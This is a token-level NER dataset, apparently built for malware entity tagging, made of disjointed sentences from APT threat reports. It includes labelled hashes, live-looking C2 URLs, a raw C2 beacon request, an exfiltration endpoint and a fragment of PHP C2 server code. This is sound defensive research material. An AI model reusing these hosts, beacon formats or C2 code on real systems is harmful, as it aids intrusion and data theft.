function	O

Siemens	O
Product	O
Computer	O
Emergency	O
Readiness	O
Team	O
(	O
ProductCERT	O
)	O
confirmed	O
that	O
IRONGATE	B-malware.backdoor
is	O
not	O
viable	O
against	O
operational	O
Siemens	O
control	O
systems	O
and	O
determined	O
that	O
IRONGATE	B-malware.backdoor
does	O
not	O
exploit	O
any	O
vulnerabilities	O
in	O
Siemens	O
products	O
.	O

Example	O
Internal	O
Beacon	O
:	O

The	O
targets	O
are	O
companies	O
in	O
energy	O
and	O
utilities	O
,	O
telecommunications	O
,	O
public	O
relations	O
,	O
media	O
,	O
financial	O
institutions	O
,	O
governmental	O
institutions	O
,	O
services	O
in	O
general	O
and	O
manufacturing	O
.	O

This	O
influence	O
campaign	O
-	O
a	O
combination	O
of	O
network	O
compromises	O
and	O
subsequent	O
data	O
leaks	O
-	O
aligns	O
closely	O
with	O
the	O
Russian	O
military	O
's	O
publicly	O
stated	O
intentions	O
and	O
capabilities	O
.	O

A	O
pro-government	O
group	O
calling	O
itself	O
the	O
Syrian	O
Electronic	O
Army	O
has	O
gained	O
visibility	O
in	O
recent	O
months	O
with	O
high	O
profile	O
attacks	O
against	O
news	O
organizations	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

Log	O
lines	O
written	O
for	O
stolen	O
data	O
from	O
browsers	O
and	O
the	O
MSN	O
messenger	O
are	O
built	O
by	O
the	O
format	O
string	O
'	O
%	O
s	O
%	O
c	O
%	O
s	O
|	O
%	O
s\n	O
'	O
,	O
where	O
the	O
first	O
string	O
is	O
likely	O
participant1	O
of	O
a	O
conversation	O
,	O
the	O
second	O
string	O
participant2	O
.	O

We	O
consider	O
it	O
likely	O
that	O
other	O
attacks	O
have	O
been	O
modeled	O
the	O
same	O
way	O
,	O
using	O
attachments	O
in	O
email	O
.	O

The	O
application	O
supports	O
the	O
following	O
command-line	O
options	O
:	O
runexe	O
1.exe	O
/c	O
command	O
...	O
rundll	O
1.dll	O
,	O
DllMain	O
When	O
attempting	O
to	O
find	O
more	O
information	O
about	O
this	O
application	O
,	O
iDefense	O
discovered	O
a	O
file	O
with	O
the	O
MD5	O
hash	O
cfa7954722d4277d26e96edc3289a4ce	B-hash
,	O
which	O
features	O
the	O
same	O
application	O
and	O
was	O
mentioned	O
in	O
a	O
2015	O
report	O
titled	O
Operation	O
Lotus	O
Blossom	O
by	O
the	O
Unit42	O
team	O
at	O
partner	O
organization	O
Palo	O
Alto	O
Networks	O
.	O

They	O
apparently	O
do	O
not	O
target	O
Israelis	O
.	O

We	O
came	O
to	O
the	O
conclusion	O
that	O
there	O
could	O
be	O
other	O
driver	O
files	O
similar	O
to	O
the	O
'	O
reference	O
'	O
file	O
mrxcls.sys	O
,	O
which	O
are	O
not	O
among	O
known	O
variants	O
of	O
Stuxnet	B-malware.backdoor
.	O

Both	O
backdoors	O
were	O
dropped	O
from	O
malicious	O
documents	O
built	O
utilizing	O
the	O
'	O
Tran	B-malware.backdoor
Duy	I-malware.backdoor
Linh	I-malware.backdoor
'	O
exploit	O
kit	O
,	O
which	O
exploited	O
CVE-2012-0158	B-malware.backdoor
.	O

For	O
a	O
list	O
of	O
services	O
,	O
visit	O
https://www.us-cert.gov/ccubedvp	B-url.normal
.	O

Carrying	O
on	O
the	O
reverse	O
engineering	O
of	O
the	O
malware	O
,	O
we	O
found	O
a	O
file	O
called	O
'	O
config.json	O
'	O
which	O
is	O
a	O
base64	O
encoded	O
json	O
file	O
containing	O
the	O
configuration	O
of	O
the	O
malware	O
and	O
its	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
.	O

GetLogicalDriveStringW	O
function	O
Creates	O
directory	O
Deletes	O
directory	O
Reads	O
a	O
file	O
from	O
an	O
offset	O
Calls	O
the	O
PE	O
Loader	O
(	O
switch	O
to	O
HTTPprov	O
communication	O
)	O
[	O
Unknown	O
]	O
0	O
:	O
Query	O
a	O
value	O
from	O
the	O
registry	O
,	O
1	O
:	O
Drop	O
and	O
execute	O
a	O
program	O
Sets	O
an	O
environment	O
variable	O
Runs	O
shellcode	O
in	O
a	O
new	O
thread	O
Retrieves	O
an	O
environment	O
variable	O
Restarts	O
itself	O
if	O
the	O
'	O
APPL	O
'	O
environment	O
variable	O
does	O
n't	O
exist	O

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service	O

Major	O
cyber	O
attacks	O
in	O
the	O
past	O
such	O
as	O
Ten	O
Days	O
of	O
Rain	O
and	O
the	O
SK	O
Communications	O
breach	O
employed	O
far	O
more	O
advanced	O
techniques	O
compared	O
to	O
Dark	O
Seoul	O
.	O

Spearphish	O
attachments	O
md5	O
:	O
5c74db6f755555ea99b51e1c68e796f9	B-hash
c3ae70b3012cc9b5c9ceb060a251715a	B-hash
560d68c31980c26d2adab7406b61c651	B-hash
da0717899e3ccc1ba0e8d32774566219	B-hash
d965a5b3548047da27b503029440e77f	B-hash
dc0de14d9d36d13a6c8a34b2c583e70a	B-hash
39562e410bc3fb5a30aca8162b20bdd0	B-hash
(	O
first	O
seen	O
late	O
2014	O
,	O
used	O
into	O
2015	O
)	O
e85e0365b6f77cc2e9862f987b152a89	B-hash
(	O
first	O
seen	O
late	O
2014	O
,	O
used	O
into	O
2015	O
)	O

Once	O
exploited	O
,	O
the	O
only	O
artifact	O
residing	O
on	O
the	O
victim	O
's	O
system	O
would	O
be	O
the	O
initial	O
lure	O
document	O
that	O
only	O
contains	O
a	O
URL	O
.	O

It	O
verifi	O
es	O
if	O
an	O
instance	O
of	O
this	O
service	O
is	O
already	O
running	O
by	O
checking	O
if	O
a	O
global	O
instance	O
variable	O
is	O
not	O
'	O
null	O
'	O
.	O

Our	O
private	O
reports	O
subscription	O
customers	O
receive	O
a	O
steady	O
stream	O
of	O
YARA	O
,	O
IOC	O
,	O
and	O
reports	O
on	O
Sofacy	O
,	O
our	O
most	O
reported	O
APT	O
for	O
the	O
year	O
.	O

Email	O
.	O

ServiceMain	O

As	O
a	O
result	O
,	O
the	O
latter	O
maintains	O
a	O
listing	O
of	O
all	O
files	O
in	O
all	O
the	O
folders	O
on	O
the	O
drive	O
.	O

Size	O
Complie	O
Time	O
Import	O
Hash	O
6e59861931fa2796ee107dc27bfdd480	B-hash
75264	O
bytes	O
2014-08-23	O
08:22:49	O
ead55ef2b18a80c00786c25211981570	B-hash

In	O
the	O
analysis	O
process	O
,	O
we	O
managed	O
to	O
retrieve	O
the	O
malware	O
payloads	O
hosted	O
on	O
one	O
of	O
the	O
command	O
and	O
control	O
servers	O
along	O
with	O
some	O
statistics	O
,	O
such	O
as	O
the	O
total	O
number	O
of	O
downloads	O
and	O
logs	O
containing	O
the	O
targeted	O
victims	O
.	O

mainThread	O
calls	O
the	O
function	O
of	O
the	O
server	O
variant	O
.	O

Here	O
is	O
the	O
PDB	O
:	O

So	O
,	O
the	O
dropper	O
creates	O
three	O
files	O
in	O

njRAT	B-malware.backdoor
is	O
a	O
Remote	O
Access	O
Tool	O
(	O
RAT	O
)	O
used	O
mostly	O
by	O
the	O
actor	O
groups	O
in	O
the	O
middle	O
east	O
.	O

Hold-transactions-pdf.jar	O
,	O
and	O
verification-docx.jar	O
The	O
'	O
INV#94586.jar	B-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
192.95.21[.]44	B-malware.infosteal
'	O
over	O
port	O
'	O
1511	O
'	O
.	O

T	O
he	O
decrypted	O
code	O
resolves	O
the	O
necessary	O
API	O
functions	O
,	O
decompresses	O
the	O
embedded	O
PE	O
file	O
with	O
RtlCompressBuffer	O
(	O
)	O
using	O
LZNT	O
1	O
and	O
maps	O
it	O
into	O
memory	O
.	O

jIRCii	O
is	O
open	O
source	O
,	O
licensed	O
under	O
the	O
artistic	O
license	O
.	O

In	O
addition	O
,	O
the	O
names	O
of	O
those	O
modules	O
are	O
taken	O
from	O
the	O
popular	O
sitcom	O
,	O
'	O
The	O
Big	O
Bang	O
Theory	O
'	O
,	O
in	O
addition	O
to	O
actors	O
'	O
names	O
from	O
the	O
popular	O
Turkish	O
TV	O
series	O
'	O
Resurrection	O
:	O
Ertugrul	O
'	O
(	O
Celal	O
Al	O
,	O
Sonmez	O
and	O
Gokhan	O
)	O
.	O

Variations	O
on	O
the	O
framework	O

If	O
the	O
client	O
's	O
request	O
does	O
not	O
meet	O
the	O
appropriate	O
authentication	O
criteria	O
,	O
the	O
server	O
variant	O
sends	O
:	O

Who	O
is	O
moayy2ad@hotmail.com	B-url.normal

Once	O
the	O
macro	O
is	O
enabled	O
,	O
it	O
will	O
use	O
the	O
event	O
to	O
automatically	O
execute	O
the	O
malicious	O
routine	O
if	O
either	O
a	O
new	O
document	O
using	O
the	O
same	O
template	O
is	O
opened	O
or	O
when	O
the	O
template	O
itself	O
is	O
opened	O
as	O
a	O
document0	O
.	O

Unlike	O
the	O
infamous	O
WannaCryptor	B-malware.ransom
malware	O
,	O
the	O
EternalBlue	B-malware.unknown
exploit	O
is	O
used	O
by	O
Diskcoder.C	O
only	O
against	O
computers	O
within	O
the	O
local	O
network	O
address	O
space	O
.	O

(	O
Note	O
:	O
we	O
believe	O
many	O
of	O
these	O
to	O
be	O
borrowed	O
from	O
legitimate	O
files	O
)	O
agent_wininet_dl.exe	O
•	O
amdh264enc32.bin	O
•	O
amdh264enc32.dll	O
•	O
amdhcp32.dll	O
•	O
amdhdl32.dll	O
•	O
amdmftdecoder_32.dll	O
•	O
amdmftvideodecoder_32.bin	O
•	O
amdmftvideodecoder_32.dll	O
•	O
amdmiracast.dll	O
•	O
amdocl_as32.exe	O
•	O
amdocl.bin	O
•	O
amdocl_ld32.exe	O
•	O
amd_opencl32.dll	O
•	O
amdpcom32.bin	O
•	O
atiadlxx.bin	O
•	O
atiadlxx.dll	O
•	O
atiapfxx.exe	O
•	O
atibtmon.exe	O
•	O
aticalcl.dll	O
•	O
aticaldd.dll	O
•	O
aticalrt.dll	O
•	O
aticfx32.bin	O
•	O
aticfx32.dll	O
•	O
atidemgy.bin	O
•	O
atidxx32.bin	O
•	O
atidxx32.dll	O
•	O
atieclxx.exe	O
•	O
atiesrxx.exe	O
•	O
atiglpxx.dll	O
•	O
atiicdxx.dat	O
•	O
atikmdag.sys	O
•	O
atimuixx.dll	O
•	O
atiodcli.exe	O
•	O
atiode.exe	O
•	O
atioglxx.bin	O
•	O
atisamu32.dll	O
•	O
atiu9pag.bin	O
•	O
atiuxpag.dll	O
•	O
ativce02.dat	O
•	O
ativvaxy_cik.dat	O
•	O
ativvaxy_cik_nd.dat	O
•	O
ativvsva.dat	O
•	O
ativvsvl.dat	O
•	O
autorun.dll	O
•	O
autorun_com.dll	O
•	O
autorun_curver.dll	O
•	O
clinfo.exe	O
•	O
coinst_13.152.dll	O
•	O
observers.dll	O
•	O
ovdecode.dll	O
•	O
wininetp.dll	O

As	O
an	O
additional	O
control	O
measure	O
,	O
the	O
program	O
was	O
only	O
activated	O
for	O
use	O
after	O
the	O
developer	O
was	O
contacted	O
and	O
issued	O
a	O
code	O
to	O
the	O
individual	O
downloading	O
the	O
application	O
.	O

DIGITAL	O
DNA	O
SEQUENCE	O
FOR	O
AURORA	B-malware.infosteal
MALWARE	O

File-based	O
protection	O

The	O
JavaScript	O
based	O
attack	O
vector	O
associated	O
with	O
Operation	B-malware.infosteal
Aurora	I-malware.infosteal
was	O
published	O
in	O
the	O
public	O
domain	O
in	O
early	O
January	O
2010	O
.	O

Whereas	O
previous	O
attacks	O
have	O
been	O
attributed	O
and	O
analyzed	O
only	O
after	O
they	O
have	O
run	O
their	O
course	O
,	O
this	O
was	O
the	O
first	O
and	O
only	O
known	O
Sofacy	B-malware.backdoor
attack	O
to	O
be	O
discovered	O
,	O
identified	O
,	O
and	O
reported	O
–	O
all	O
before	O
it	O
could	O
even	O
begin	O
!	O

3baaf1a873304d2d607dbedf47d3e2b4	B-hash
3195202066f026de3abfe2f966c9b304	B-hash
4839370628678f0afe3e6875af010839	B-hash
173c1528dc6364c44e887a6c9bd3e07c	B-hash
191d2da5da0e37a3bb3cbca830a405ff	B-hash
5eef25dc875cfcb441b993f7de8c9805	B-hash
b20c5db37bda0db8eb1af8fc6e51e703	B-hash
face9e96058d8fe9750d26dd1dd35876	B-hash
9f7faf77b1a2918ddf6b1ef344ae199d	B-hash
d0af6b8bdc4766d1393722d2e67a657b	B-hash
45448a53ec3db51818f57396be41f34f	B-hash
80cba157c1cd8ea205007ce7b64e0c2a	B-hash
f68fa3d8886ef77e623e5d94e7db7e6c	B-hash
4a1ac739cd2ca21ad656eaade01a3182	B-hash
4ea3958f941de606a1ffc527eec6963f	B-hash
637e0c6d18b4238ca3f85bcaec191291	B-hash
b3caca978b75badffd965a88e08246b0	B-hash
dbedadc1663abff34ea4bdc3a4e03f70	B-hash
3ae894917b1d8e4833688571a0573de4	B-hash
8a85bd84c4d779bf62ff257d1d5ab88b	O
d94f7a8e6b5d7fc239690a7e65ec1778	B-hash
f1389f2151dc35f05901aba4e5e473c7	B-hash
96280f3f9fd8bdbe60a23fa621b85ab6	B-hash
f25c6f40340fcde742018012ea9451e0	O
122c523a383034a5baef2362cad53d57	B-hash
2173bbaea113e0c01722ff8bc2950b28	B-hash
2a0b18fa0887bb014a344dc336ccdc8c	O
ffad0446f46d985660ce1337c9d5eaa2	B-hash
81b484d3c5c347dc94e611bae3a636a3	B-hash
ab73b1395938c48d62b7eeb5c9f3409d	B-hash
69930320259ea525844d910a58285e15	B-hash

This	O
report	O
documents	O
the	O
first	O
ever	O
operation	O
to	O
use	O
threat	O
intelligence	O
and	O
adversary	O
tactics	O
to	O
discover	O
and	O
reveal	O
the	O
prepositioning	O
of	O
Sofacy	B-malware.backdoor
zero-day	O
malware	O
.	O

Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O
Dropper	O
Filename	O
:	O
Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O
Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O
Dropper	O
Filename	O
:	O
Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O
Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O
Dropper	O
Filename	O
:	O
Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O
Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O
Dropper	O
Filename	O
:	O
Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O
Decoded	O
'	O
i	O
'	O
Value	O
:	O
Compile	O
Time	O
:	O
Dropper	O
Filename	O
:	O

In	O
addition	O
to	O
using	O
compromised	O
servers	O
to	O
scan	O
numerous	O
resources	O
,	O
other	O
attacker	O
activity	O
was	O
also	O
identified	O
.	O

Here	O
's	O
a	O
list	O
for	O
some	O
ZxShell	B-malware.backdoor
functions	O
for	O
sample	O
SHA256	O
:	O
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c	B-hash
:	O

'	O
Pending	O
'	O
,	O
only	O
if	O
the	O
command	O
string	O
matches	O
with	O
string	O
'	O
Pending	O
'	O
the	O
download	O
functionality	O
is	O
triggered	O
.	O

These	O
accounts	O
were	O
used	O
to	O
advertise	O
fake	O
'	O
blockchain	O
exploit	O
tool	O
'	O
,	O
which	O
infects	O
the	O
victim	O
's	O
machine	O
with	O
Cobalt	O
Strike	O
,	O
using	O
a	O
similar	O
VBScript	O
to	O
the	O
one	O
found	O
by	O
Malwrologist	O
(	O
ps5.sct	O
)	O
.	O

http://apple-iclods.org/close/?itwm=LO6iN-PjpD0U8AVlLo_Hk3X9FSgAF	B-url.cncsvr
&	O
xzxI4=9_qwCS03APJT	O
HTTP/1.1	O
Host	O
:	O
apple	B-url.cncsvr
-iclods.org	I-url.cncsvr
Pragma	O
:	O
no	O
-cache	O
Connection	O
:	O
keep	O
-alive	O
Accept	O
:	O
*/*	O

To	O
capture	O
video	O
,	O
EvilGrab	B-malware.drop
creates	O
a	O
capture	O
window	O
with	O
the	O
class	O
name	O
of	O
ESET	O
.	O

This	O
campaign	O
is	O
not	O
the	O
first	O
sign	O
of	O
life	O
from	O
these	O
actors	O
after	O
we	O
published	O
our	O
report	O
–	O
there	O
have	O
been	O
several	O
smaller	O
initiatives	O
during	O
the	O
autumn	O
of	O
2013	O
.	O

The	O
Darkhotel	B-malware.infosteal
APT	I-malware.infosteal
will	O
relentlessly	O
spearphish	O
specific	O
targets	O
in	O
order	O
to	O
successfully	O
compromise	O
systems	O
.	O

whenever	O
the	O
malware	O
made	O
a	O
C2	O
connection	O
.	O

case	O
'	O
p	O
'	O
:	O

$	O
writelogs	O
=	O
false	O
;	O
//true	O
to	O
create	O
logs	O
file	O
in	O
logs	O
directory	O
$	O
version	O
=	O
3	O
;	O
$	O
get_varname_user	O
=	O
'	O
user	O
'	O
;	O
$	O
get_varname_id	O
=	O
'	O
id	O
'	O
;	O
$	O
get_varname_seq	O
=	O
'	O
seq	O
'	O
;	O
$	O
storefile	O
=	O
'	O
storage/file	O
'	O
;	O
$	O
ext	O
=	O
'	O
.kv	O
'	O
;	O
$	O
maxsize	O
=	O
1024*1024*2	O
;	O
//0	O
=	O
unlimited	O
size	O
if	O
we	O
choose	O
predifined	O
files	O
$	O
UOK_V3	O
=	O
0x7345d346	O
;	O
function	O
disableCache	O
(	O
)	O
{	O
$	O
expires	O
=	O
0	O
;	O
$	O
gm_expires	O
=	O
gmdate	O
(	O
'D	O
,	O
dMYH	O
:	O
i	O
:	O
s	O
'	O
,	O
time	O
(	O
)	O
+	O
$	O
expires	O
)	O
;	O
header	O
(	O
'	O
Cache-control	O
:	O
private	O
,	O
max-age=	O
$	O
expires	O
,	O
pre-check=	O
$	O
expires	O
'	O
)	O
;	O
header	O
(	O
'	O
Expires	O
:	O
$	O
gm_expires	O
GMT	O
'	O
)	O
;	O
header	O
(	O
'	O
Last-Modified	O
:	O
'	O
.	O

Specifically	O
we	O
found	O
that	O
the	O
malware	O
utilized	O
the	O
following	O
techniques	O
:	O
Different	O
types	O
of	O
XOR	O
techniques	O
to	O
obfuscate	O
components	O
and	O
its	O
contained	O
strings	O
The	O
use	O
of	O
trusted	O
security	O
software	O
as	O
a	O
decoy	O
during	O
initial	O
infection	O
Sandbox	O
detection	O
A	O
mangled	O
MZ	O
header	O
to	O
deceive	O
security	O
products	O
String	O
Stacking	O
obfuscation	O
with	O
Unicode	O
Strings	O
More	O
than	O
one	O
layer	O
of	O
obfuscation	O
for	O
its	O
command	O
and	O
control	O
traffic	O
Un-Install	O
functionality	O
A7BD555866AE1C161F78630A638850E7	B-hash
Initial	O
Launcher/Dropper	O
2F7E5F91BE1F5BE2B2F4FDA0910A4C16	B-hash
4F4BF27B738FF8F2A89D1BC487B054A8	B-hash
75D3D1F23628122A64A2F1B7EF33F5CF	B-hash
68F1419721354EC1f78A71E10B54FCA8	B-hash
Decoy	O
Installer	O
for	O
Cisco	O
AnyConnect	O
Mobility	O
Client	O
RAT	B-malware.backdoor
Installer	O
Executable	O
(	O
EXE	O
)	O
Executable	O
(	O
EXE	O
)	O
Executable	O
(	O
EXE	O
)	O
RAT	B-malware.backdoor
Implant/Payload	O
Cisco	O
AnyConnect	O
Mobility	O
Client	O
OLE	O
Control	O
Library	O
(	O
DLL	O
)	O
Valid	O
Signed	O
Executable	O
(	O
EXE	O
)	O
The	O
initial	O
launcher/dropper	O
writes	O
two	O
executable	O
files	O
to	O
the	O
hard	O
drive	O
,	O
the	O
RAT	B-malware.backdoor
Installer	O
(	O
MD5	O
:	O
4F4BF27B738FF8F2A89D1BC487B054A8	B-hash
)	O
and	O
the	O
Cisco	O
AnyConnect	O
decoy	O
(	O
MD5	O
:	O
2F7E5F91BE1F5BE2B2F4FDA0910A4C16	B-hash
)	O
.	O

Hardware	O
information	O
.	O

We	O
retrieved	O
the	O
original	O
functions	O
names	O
as	O
plaintext	O
strings	O
by	O
using	O
a	O
simple	O
Python	O
script	O
.	O

The	O
analysts	O
of	O
Antiy	O
thought	O
that	O
the	O
attacker	O
might	O
know	O
several	O
remote	O
injection	O
methods	O
of	O
script	O
downloading	O
privilege	O
,	O
such	O
as	O
directly	O
making	O
the	O
scrip	O
be	O
executed	O
on	O
the	O
host	O
by	O
using	O
security	O
vulnerabilities	O
.	O

It	O
is	O
not	O
surprising	O
that	O
attackers	O
use	O
vulnerabilities	O
that	O
are	O
older	O
,	O
because	O
,	O
unfortunately	O
,	O
many	O
computers	O
are	O
likely	O
to	O
be	O
still	O
out	O
of	O
date	O
and	O
so	O
the	O
attack	O
works	O
.	O

This	O
archive	O
contains	O
the	O
CozyDuke	B-malware.drop
components	O
that	O
the	O
dropper	O
will	O
later	O
install	O
on	O
the	O
victim	O
system	O
.	O

A	O
hired	O
actor	O
may	O
also	O
explain	O
the	O
generic	O
and	O
uninspired	O
nature	O
of	O
the	O
phishing	O
,	O
which	O
often	O
took	O
the	O
form	O
of	O
an	O
email	O
purporting	O
to	O
contain	O
an	O
invoice	O
or	O
a	O
legal	O
document	O
with	O
an	O
attachment	O
containing	O
a	O
blurry	O
image	O
.	O

The	O
file	O
descriptions	O
and	O
other	O
properties	O
of	O
the	O
malware	O
look	O
convincingly	O
legitimate	O
at	O
first	O
glance	O
.	O

Operation	O
Molerats	O

mrayesh.blogspot[.]com	B-url.normal
The	O
blog	O
was	O
created	O
by	O
mo'ayyad	O
on	O
Blogger	O
,	O
who	O
is	O
also	O
using	O
the	O
name	O
mo'ayy	O
.	O

The	O
backdoor	O
expects	O
a	O
command	O
line	O
parameter	O
that	O
specifies	O
remote	O
C	O
&	O
C	O
address	O
and	O
port	O
number	O
.	O

The	O
shellcode	O
exists	O
as	O
a	O
Unicode	O
escaped	O
variable	O
(	O
sc	O
)	O
in	O
the	O
malicious	O
JavaScript	O
listed	O
below	O
.	O

Syria	O
's	O
opposition	O
has	O
faced	O
persistent	O
targeting	O
by	O
Pro-Government	O
Electronic	O
Actors	O
(	O
PGEAs	O
)	O
throughout	O
the	O
Syrian	O
civil	O
war	O
.	O

The	O
second	O
Babar64	B-malware.drop
binary	O
comes	O
with	O
its	O
own	O
set	O
of	O
C	O
&	O
C	O
servers	O
:	O
http://www.alexpetro.com/images/training/courses/bb212/index.php	B-url.cncsvr
http://www.etehadyie.ir/images/public/bb212/index.php	B-url.cncsvr
The	O
first	O
one	O
is	O
the	O
legitimate	O
website	O
of	O
AlexPetro	O
Technical	O
Services	O
,	O
a	O
company	O
operating	O
in	O
the	O
oil	O
and	O
gas	O
industry	O
in	O
Kairo	O
,	O
Egypt	O
.	O

When	O
VPN-Pro.exe	B-malware.drop
is	O
run	O
,	O
the	O
victim	O
is	O
shown	O
the	O
Freegate	B-malware.infosteal
end-user	O
license	O
agreement	O
(	O
EULA	O
)	O
dialogue	O
box	O
.	O

In	O
an	O
August	O
2012	O
response	O
to	O
a	O
letter	O
from	O
UK-based	O
NGO	O
Privacy	O
International	O
,	O
the	O
UK	O
Government	O
revealed	O
that	O
at	O
some	O
unspecified	O
time	O
in	O
the	O
past	O
,	O
it	O
had	O
examined	O
a	O
version	O
of	O
FinSpy	B-malware.backdoor
,	O
and	O
communicated	O
to	O
Gamma	O
that	O
a	O
license	O
would	O
be	O
required	O
to	O
export	O
that	O
version	O
outside	O
of	O
the	O
EU	O
.	O

Based	O
on	O
additional	O
corroboration	O
,	O
we	O
assess	O
high	O
confidence	O
in	O
this	O
information	O
.	O

When	O
you	O
start	O
the	O
controller	O
,	O
you	O
need	O
to	O
set	O
the	O
port	O
you	O
want	O
to	O
listen	O
on	O
and	O
if	O
you	O
've	O
set	O
a	O
password	O
,	O
add	O
it	O
here	O
.	O

برقعلا	O
ليعامسإ	O
ديرف	O
يدايقلا	O
تومل	O
ةيقيقحلا	O
ةصقلا	O

As	O
such	O
,	O
we	O
propose	O
two	O
simple	O
steps	O
that	O
Freegate	B-malware.infosteal
could	O
take	O
to	O
help	O
mitigate	O
the	O
current	O
and	O
similar	O
future	O
threats	O
.	O

Our	O
initial	O
finding	O
focused	O
on	O
'	O
로그인	O
오류	O
.hwp	O
'	O
or	O
'	O
Korean	O
Day	O
'	O
lure	O
,	O
but	O
once	O
we	O
created	O
a	O
signature	O
for	O
the	O
particular	O
implementation	O
of	O
the	O
PostScript	O
,	O
we	O
found	O
three	O
additional	O
lure	O
documents	O
in	O
a	O
public	O
malware	O
repository	O
tied	O
together	O
by	O
the	O
use	O
of	O
this	O
exploit	O
:	O
two	O
CVs	O
and	O
a	O
cryptocurrency	O
exchange-themed	O
lure	O
.	O

This	O
actor	O
is	O
probably	O
not	O
the	O
most	O
advanced	O
actor	O
we	O
've	O
seen	O
.	O

Analyzed	O
file	O
(	O
others	O
are	O
similar	O
)	O
:	O

Figure	O
16	O
.	O

Learn	O
how	O
to	O
protect	O
Enterprises	O
,	O
Small	O
Businesses	O
,	O
and	O
Home	O
Users	O
from	O
ransomware	O
:	O
Tags	O
:	O
Confucius	O
CVE-2015-1641	B-malware.unknown
CVE-2017-11882	B-malware.backdoor
Patchwork	O
Romance	O
Scam	O
Home	O
and	O
Home	O
Office	O
For	O
Business	O
Security	O
Intelligence	O
About	O
Trend	O
Micro	O
Asia	O
Pacific	O
Region	O
(	O
APAC	O
)	O
:	O
Australia	O
/	O
New	O
Zealand	O
,	O
中国	O
,	O
日本	O
,	O
대한민국	O
,	O
台灣	O

It	O
also	O
serves	O
as	O
the	O
loader	O
of	O
the	O
main	O
backdoor	O
.	O

The	O
following	O
items	O
are	O
gathered	O
from	O
the	O
infected	O
system	O
:	O
OS	O
name	O
OS	O
version	O
OS	O
architecture	O
AV	O
installed	O
List	O
of	O
banking	O
software	O
installed	O
IP	O
address	O
Directory	O
where	O
malware	O
is	O
being	O
executed	O
from	O
The	O
information	O
is	O
sent	O
to	O
hxxp://108.61.188.171/put.php	B-url.unknown
(	O
Figure	O
20	O
)	O
.	O

20	O
Sept	O
.	O

Commands	O
used	O
in	O
uploading	O
and	O
downloading	O
file	O
Figure	O
30	O
.	O

It	O
is	O
no	O
more	O
complicated	O
than	O
any	O
other	O
malware	O
we	O
observe	O
on	O
a	O
daily	O
basis	O
.	O

2016년	O
4월에는	O
방위산업체	O
,	O
해양	O
서비스	O
업체	O
,	O
ICT	O
기업	O
등이	O
중앙관리	O
솔루션	O
B의	O
취약점을	O
이용한	O
악성	O
코드	O
Ghostrat에	B-malware.backdoor
감염되었다	O
.	O

It	O
follows	O
Stuxnet	O
which	O
was	O
used	O
against	O
Iran	O
in	O
2010	O
and	O
Industroyer	O
which	O
we	O
believe	O
was	O
deployed	O
by	O
Sandworm	O
Team	O
against	O
Ukraine	O
in	O
2016	O
.	O

[	O
표	O
1	O
]	O
은	O
안다리엘	O
그룹의	O
주요	O
공격	O
사례를	O
정리한	O
것이다	O
.	O

The	O
evidence	O
is	O
consistent	O
with	O
links	O
to	O
Appin	O
,	O
but	O
remains	O
inconclusive	O
.	O

Based	O
on	O
engines	O
,	O
sandboxes	O
and	O
background	O
systems	O
,	O
Antiy	O
Labs	O
will	O
continue	O
to	O
provide	O
traffic-based	O
anti-APT	O
solutions	O
for	O
enterprises	O
.	O

Technical	O
Details	O

The	O
key	O
is	O
embedded	O
in	O
the	O
header	O
of	O
the	O
packet	O
,	O
and	O
is	O
easily	O
recovered	O
.	O

Each	O
IRONGATE	B-malware.drop
dropper	O
currently	O
identified	O
deploys	O
the	O
same	O
.NET	O
payload	O
,	O
scada.exe	B-malware.unknown
.	O

Further	O
analysis	O
showed	O
that	O
the	O
Iron	O
cybercrime	O
group	O
used	O
two	O
main	O
functions	O
from	O
HackingTeam	O
's	O
source	O
in	O
both	O
IronStealer	B-malware.infosteal
and	O
Iron	B-malware.ransom
ransomware	O
.	O

In	O
particular	O
,	O
we	O
identified	O
advanced	O
methods	O
consistent	O
with	O
nation-state	O
level	O
capabilities	O
including	O
deliberate	O
targeting	O
and	O
'	O
access	O
management	O
'	O
tradecraft	O
–	O
both	O
groups	O
were	O
constantly	O
going	O
back	O
into	O
the	O
environment	O
to	O
change	O
out	O
their	O
implants	O
,	O
modify	O
persistent	O
methods	O
,	O
move	O
to	O
new	O
Command	O
&	O
Control	O
channels	O
and	O
perform	O
other	O
tasks	O
to	O
try	O
to	O
stay	O
ahead	O
of	O
being	O
detected	O
.	O

In	O
our	O
2014	O
report	O
,	O
we	O
identified	O
APT28	B-malware.infosteal
as	O
a	O
suspected	O
Russian	O
government-sponsored	O
espionage	O
actor	O
.	O

/blog/research/76147/on-the-strongpity-waterhole-attacks-targeting-italian-and-belgian-encryption-users/	B-url.normal
By	O
Kurt	O
Baumgartner	O
Kurt	O
Baumgartner	O
Principal	O
Security	O
Researcher	O
,	O
GReAT	O
The	O
StrongPity	O
APT	O
is	O
a	O
technically	O
capable	O
group	O
operating	O
under	O
the	O
radar	O
for	O
several	O
years	O
.	O

The	O
First	O
to	O
Write	O
the	O
Payload	O
File	O
and	O
Then	O
the	O
Second	O
to	O
Correct	O
the	O
First	O
to	O
Bytes	O
to	O
MZ	O
.	O

We	O
surmise	O
this	O
DLL	O
simulates	O
generation	O
of	O
IO	O
values	O
,	O
which	O
would	O
normally	O
be	O
provided	O
by	O
an	O
S7-based	O
controller	O
,	O
since	O
the	O
functions	O
it	O
includes	O
appear	O
derived	O
from	O
the	O
Siemens	O
PLCSIM	O
environment	O
.	O

The	O
developers	O
could	O
be	O
using	O
a	O
proxy	O
or	O
a	O
VPN	O
in	O
order	O
to	O
fake	O
the	O
origin	O
of	O
the	O
submission	O
